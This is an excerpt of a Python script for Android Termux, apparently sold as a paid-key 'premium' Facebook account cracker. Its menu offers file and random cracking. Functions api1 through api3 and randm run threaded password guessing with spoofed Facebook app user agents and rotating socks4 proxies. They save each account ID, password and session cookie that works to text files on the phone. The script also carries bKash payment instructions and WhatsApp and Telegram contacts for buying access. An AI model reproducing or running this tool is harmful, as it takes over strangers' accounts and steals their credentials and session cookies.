...
# GITHUB LINK : MR-AKASH-404
# MACK BY :  MR AKASH KING
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
from os import path
...
class Get_Data:
    def __init__(self):
        self.url = "https://raw.githubusercontent.com/MR-AKASH-404/Aa.txt/refs/heads/main/Aa.txt"
    def get(self):
        respone = requests.get("https://raw.githubusercontent.com/MR-AKASH-404/Aa.txt/refs/heads/main/Aa.txt").text
...
class Main:
    ...
    def check(self):
        if self.status == "EXPIRE-KEY":
            clear();print(f"{A}[{R}={A}] {G}USERNAME{R} : {A}MR AKASH");print(f"{A}[{R}={A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}={A}] {G}YOU ARE NOT PREMUIM USER FIRST BUY PREMUIM');linex();print(f"{A}[{R}={A}] {G}IF YOU WANT TO BUY COMMAND BY YOUR OWN WILLING, SEND {A}350 [15 DAYS] {G}|{A} 600 [30 DAYS] {G}TO THE GIVEN BKASH ACCOUNT AND SEND YOUR TOKEN AND PAYMENT SCREENSHOT TO THE GIVEN WHATSAPP NUMBER");linex();print(f"{A}[{R}={A}] {G}1 TOKEN IS ONLY FOR 1 DEVICE, YOU CANNOT TRANSFER YOUR SUBSCRIPTION");linex();print(f"{A}[{R}={A}] {G}YOUR ARE ONLY ELIGIBLE TO GET REFUND OR AGAIN SUBSCRIPTION, IF YOURTOKEN IS NOT CHANGED. IF HAPPENS, YOU WILL NOT BE ABLE TO CLAIM REFUND OR RECOVERY OF SUBSCRIPTION");linex();print(f"{A}[{R}={A}] {G}IF YOUR SUBSCRIPTION ENDS BY CLEARING DATA, SYSTEM UPDATE,DELETING TERMUX OR DOWNGRADING AND UPGRADING TERMUX APK, YOUR WILL NOT BE ABLE TO GET SUBSCRIPTION UNTILL YOU PAY AGAIN");linex();print(f"{A}[{R}={A}] {G}WHATSAPP NUMBER{R} >> {G}+8801924709552");linex();input(f"{A}[{R}={A}] {G}TELEGRAM ID    {R} >> {G}@AKASHfire");linex()
            sys.exit()
...
def yek():
    ...
    umah = '[FBAN/FB4A;FBAV/505.0.0.57.45;FBBV/460014470;FBDM/{density=2.0,width=720,height=1280};FBLC/Grameenphone;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'
    xuna = sex+umah
...
\033[1;32m╚═╝  ╚═╝\033[1;31m╚═╝  ╚═╝\033[1;32m╚═╝  ╚═╝\033[1;31m╚══════╝\033[1;32m╚═╝  ╚═╝                                                                                                                                                                                 
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{R}={A}] {G}FACEBOOK   {R} >>   {A}MR AKASH
{A}[{R}={A}] {G}STATUS      {R}>>   {A}FILE {R}X{A} RANDOM
{A}[{R}={A}] {G}VERSION   {R}  >>   {A}1.0
{A}[{R}={A}] {G}QUALITY   {R}  >>   {A}PREMIUM
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
        try:                        
                        clear();print(f"{A}[{R}={A}] {G}USERNAME{R} : {A}MR AKASH");print(f"{A}[{R}={A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}1{A}] {G}FILE CRACK\n{A}[{R}2{A}] {G}RANDOM CRACK\n{A}[{R}3{A}] {G}JOINT PUBLIC GROUP \n{A}[{R}4{A}] {G}EXIT')
                        linex()
                        AKASH=input(f'{A}[{R}={A}] {G}INPUT {R}>>{A} ')
                        if AKASH in ['1','01']:
                                clear();print(f'{A}[{R}={A}]{G} EXAMPLE {R}:{A} /sdcard/AKASH.txt ');linex()
                                ...
                                clear()
                                plist = []           
                                print(f'{A}[{R}1{A}]{G} 30 PASSWORD AUTO PASS\n{A}[{R}2{A}]{G} CHOICE PASSWORD CLONE');linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f"{A}[{R}={A}] {G}USERNAME{R} : {A}MR AKASH");print(f"{A}[{R}={A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}={A}]{G} SIM NAME  {R}>> {A}ROBI {R}>>{A} BANGLALINK ')
                                ...
                                os.system('xdg-open https://t.me/AKASH_ON_FIRE_99');menu()
                        elif AKASH in ['0','00']:
...
def api1(ids,names,passlist):
    ...
    sys.stdout.write(f"\r\r{R}[{G}AKASH-F1{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m{A}[{G}AKASH-OK💉{A}]{G} '+ids+f' {R}•{G} '+pas+'')
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} {coki}")
                open('/sdcard/AKASH-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[AKASH-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/AKASH-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    ...
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f"\r\r{R}[{G}AKASH-F2{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                open('/sdcard/AKASH-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[AKASH-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/AKASH-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api3(ids,names,passlist):
    ...
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f"\r\r{R}[{G}AKASH-F3{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m{A}[{G}AKASH-OK💉{A}]{G} '+ids+f' {R}•{G} '+pas+'')
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} {coki}")
                open('/sdcard/AKASH-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[AKASH-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/AKASH-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r\r{A}[{G}AKASH-RN{A}] >> {A}[{R}{loop}{A}]{R} >> {A}[{G}OK{A}•{G}{len(oks)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r\x1b[38;5;46m{A}[{G}AKASH-OK💉{A}]{G} {uid} | {pas}')
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} {coki}")
                open('/sdcard/AKASH-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
